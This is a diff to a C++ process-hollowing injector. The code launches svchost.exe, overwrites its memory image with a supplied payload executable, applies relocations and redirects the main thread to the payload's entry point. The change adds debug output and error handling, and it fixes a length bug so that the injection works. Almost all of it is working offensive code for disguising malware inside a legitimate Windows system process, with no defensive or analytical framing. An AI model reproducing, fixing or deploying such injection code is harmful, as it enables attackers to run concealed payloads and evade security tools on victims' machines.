@@ -61,39 +61,45 @@ void UnmapAndAllocate(HANDLE hProcess, PVOID imageBase, size_t imageSize) {
 
 // Perform the process hollowing
 bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
+    cout << "[debug] Starting RunPE...\n";
+
     auto* dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(lpImage);
     auto* ntHeaders = reinterpret_cast<PIMAGE_NT_HEADERS64>(reinterpret_cast<uintptr_t>(dosHeader) + dosHeader->e_lfanew);
 
-    // Retrieve base address from the target process
     ProcessAddressInformation addressInfo = GetProcessAddressInformation(hProcess);
     if (!addressInfo.lpProcessImageBaseAddress) {
         cerr << "[error] Failed to get process image base address.\n";
         return false;
     }
 
-    // Unmap and allocate space in target process
+    cout << "[debug] Target process image base address: " << addressInfo.lpProcessImageBaseAddress << "\n";
+
     UnmapAndAllocate(hProcess, addressInfo.lpProcessImageBaseAddress, ntHeaders->OptionalHeader.SizeOfImage);
 
-    // Copy headers
-    WriteProcessMemory(hProcess, addressInfo.lpProcessImageBaseAddress, lpImage, ntHeaders->OptionalHeader.SizeOfHeaders, nullptr);
+    cout << "[debug] Writing headers...\n";
+    if (!WriteProcessMemory(hProcess, addressInfo.lpProcessImageBaseAddress, lpImage, ntHeaders->OptionalHeader.SizeOfHeaders, nullptr)) {
+        cerr << "[error] Failed to write headers. Error: " << GetLastError() << "\n";
+        return false;
+    }
 
-    // Copy sections
+    cout << "[debug] Writing sections...\n";
     for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
         PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders) + i;
         if (section->SizeOfRawData == 0) continue;
 
         LPVOID pRemoteSection = reinterpret_cast<PBYTE>(addressInfo.lpProcessImageBaseAddress) + section->VirtualAddress;
         LPVOID pLocalSection = reinterpret_cast<PBYTE>(lpImage) + section->PointerToRawData;
-        WriteProcessMemory(hProcess, pRemoteSection, pLocalSection, section->SizeOfRawData, nullptr);
+        if (!WriteProcessMemory(hProcess, pRemoteSection, pLocalSection, section->SizeOfRawData, nullptr)) {
+            cerr << "[error] Failed to write section " << i << ". Error: " << GetLastError() << "\n";
+            return false;
+        }
     }
 
-    // Calculate delta for rebasing
+    cout << "[debug] Applying relocations...\n";
     DWORD_PTR delta = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress) - ntHeaders->OptionalHeader.ImageBase;
-    ntHeaders->OptionalHeader.ImageBase = reinterpret_cast<DWORD_PTR>(addressInfo.lpProcessImageBaseAddress);
-
-    // Apply relocations if necessary
     if (delta != 0) {
-        PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>((PBYTE)lpImage + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
+        PIMAGE_BASE_RELOCATION reloc = reinterpret_cast<PIMAGE_BASE_RELOCATION>(
+            (PBYTE)lpImage + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
         while (reloc->VirtualAddress != 0) {
             DWORD numEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
             PWORD relocEntries = reinterpret_cast<PWORD>((PBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
@@ -105,7 +111,8 @@ bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
                 int offset = relocEntries[i] & 0xFFF;
 
                 if (type == IMAGE_REL_BASED_DIR64) {
-                    DWORD_PTR* patchAddr = reinterpret_cast<DWORD_PTR*>(reinterpret_cast<PBYTE>(addressInfo.lpProcessImageBaseAddress) + reloc->VirtualAddress + offset);
+                    DWORD_PTR* patchAddr = reinterpret_cast<DWORD_PTR*>(
+                        reinterpret_cast<PBYTE>(addressInfo.lpProcessImageBaseAddress) + reloc->VirtualAddress + offset);
 
                     DWORD_PTR originalAddr;
                     ReadProcessMemory(hProcess, patchAddr, &originalAddr, sizeof(DWORD_PTR), nullptr);
@@ -117,7 +124,7 @@ bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
         }
     }
 
-    // Set the thread context to start execution at the entry point
+    cout << "[debug] Setting thread context...\n";
     CONTEXT ctx;
     ctx.ContextFlags = CONTEXT_FULL;
     GetThreadContext(hThread, &ctx);
@@ -129,12 +136,19 @@ bool RunPE(HANDLE hProcess, HANDLE hThread, LPVOID lpImage, size_t imageSize) {
     SetThreadContext(hThread, &ctx);
     ResumeThread(hThread);
 
+    cout << "[debug] Thread resumed successfully.\n";
+
     return true;
 }
 
+
 void startInjection(unsigned char data[], unsigned int data_len) {
+    cout << "[debug] Starting payload injection.\n";
+    cout << "[debug] Payload size: " << data_len << ".\n";
+
     STARTUPINFOA si = {sizeof(si)};
     PROCESS_INFORMATION pi;
+
     if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", 
         nullptr, 
         nullptr, 
@@ -144,15 +158,22 @@ void startInjection(unsigned char data[], unsigned int data_len) {
         nullptr, 
         nullptr, 
         &si, 
-        &pi)){
+        &pi)) {
         cerr << "[error] Failed to create target process. Error: " << GetLastError() << "\n";
+        return;
     }
 
-    // Execute the process hollowing
-    if (!RunPE(pi.hProcess, pi.hThread, data, sizeof(data_len))) {
+    cout << "[debug] Target process created. PID: " << pi.dwProcessId << ".\n";
+
+    if (!RunPE(pi.hProcess, pi.hThread, data, data_len)) {
         cerr << "[error] Process hollowing failed.\n";
         TerminateProcess(pi.hProcess, 0);
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+        return;
     }
+
+    cout << "[debug] Payload executed successfully.\n";
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
